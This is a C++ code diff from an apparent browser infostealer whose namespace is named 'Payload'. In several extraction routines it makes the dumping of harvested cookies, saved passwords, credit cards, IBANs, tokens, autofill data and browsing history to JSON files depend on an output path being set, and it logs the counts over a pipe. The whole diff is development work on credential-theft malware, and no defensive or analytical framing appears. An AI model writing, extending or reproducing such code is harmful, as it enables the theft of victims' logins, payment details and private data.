@@ -299,13 +299,16 @@ namespace Payload {
         sqlite3_finalize(stmt);
 
         if (!entries.empty()) {
-            std::filesystem::create_directories(outFile.parent_path());
-            std::ofstream out(outFile);
-            out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) {
-                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            // CHANGED: Only create files if output path was provided
+            if (!m_outputBase.empty()) {
+                std::filesystem::create_directories(outFile.parent_path());
+                std::ofstream out(outFile);
+                out << "[\n";
+                for (size_t i = 0; i < entries.size(); ++i) {
+                    out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                }
+                out << "]";
             }
-            out << "]";
             m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
         }
     }
@@ -353,13 +356,16 @@ namespace Payload {
         sqlite3_finalize(stmt);
 
         if (!entries.empty()) {
-            std::filesystem::create_directories(outFile.parent_path());
-            std::ofstream out(outFile);
-            out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) {
-                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            // CHANGED: Only create files if output path was provided
+            if (!m_outputBase.empty()) {
+                std::filesystem::create_directories(outFile.parent_path());
+                std::ofstream out(outFile);
+                out << "[\n";
+                for (size_t i = 0; i < entries.size(); ++i) {
+                    out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                }
+                out << "]";
             }
-            out << "]";
             m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
         }
     }
@@ -428,11 +434,14 @@ namespace Payload {
         sqlite3_finalize(stmt);
 
         if (!entries.empty()) {
-            std::filesystem::create_directories(outFile.parent_path());
-            std::ofstream out(outFile);
-            out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
-            out << "]";
+            // CHANGED: Only create files if output path was provided
+            if (!m_outputBase.empty()) {
+                std::filesystem::create_directories(outFile.parent_path());
+                std::ofstream out(outFile);
+                out << "[\n";
+                for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                out << "]";
+            }
             m_pipe.Log("CARDS:" + std::to_string(entries.size()));
         }
     }
@@ -474,11 +483,14 @@ namespace Payload {
         sqlite3_finalize(stmt);
 
         if (!entries.empty()) {
-            std::filesystem::create_directories(outFile.parent_path());
-            std::ofstream out(outFile);
-            out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
-            out << "]";
+            // CHANGED: Only create files if output path was provided
+            if (!m_outputBase.empty()) {
+                std::filesystem::create_directories(outFile.parent_path());
+                std::ofstream out(outFile);
+                out << "[\n";
+                for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                out << "]";
+            }
             m_pipe.Log("IBANS:" + std::to_string(entries.size()));
         }
     }
@@ -540,11 +552,14 @@ namespace Payload {
         sqlite3_finalize(stmt);
 
         if (!entries.empty()) {
-            std::filesystem::create_directories(outFile.parent_path());
-            std::ofstream out(outFile);
-            out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
-            out << "]";
+            // CHANGED: Only create files if output path was provided
+            if (!m_outputBase.empty()) {
+                std::filesystem::create_directories(outFile.parent_path());
+                std::ofstream out(outFile);
+                out << "[\n";
+                for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                out << "]";
+            }
             m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
         }
     }
@@ -583,13 +598,16 @@ namespace Payload {
         sqlite3_finalize(stmt);
 
         if (!entries.empty()) {
-            std::filesystem::create_directories(outFile.parent_path());
-            std::ofstream out(outFile);
-            out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) {
-                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            // CHANGED: Only create files if output path was provided
+            if (!m_outputBase.empty()) {
+                std::filesystem::create_directories(outFile.parent_path());
+                std::ofstream out(outFile);
+                out << "[\n";
+                for (size_t i = 0; i < entries.size(); ++i) {
+                    out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                }
+                out << "]";
             }
-            out << "]";
             m_pipe.Log("AUTOFILL:" + std::to_string(entries.size()));
         }
     }
@@ -633,13 +651,16 @@ namespace Payload {
         sqlite3_finalize(stmt);
 
         if (!entries.empty()) {
-            std::filesystem::create_directories(outFile.parent_path());
-            std::ofstream out(outFile);
-            out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) {
-                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            // CHANGED: Only create files if output path was provided
+            if (!m_outputBase.empty()) {
+                std::filesystem::create_directories(outFile.parent_path());
+                std::ofstream out(outFile);
+                out << "[\n";
+                for (size_t i = 0; i < entries.size(); ++i) {
+                    out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                }
+                out << "]";
             }
-            out << "]";
             m_pipe.Log("HISTORY:" + std::to_string(entries.size()));
         }
     }
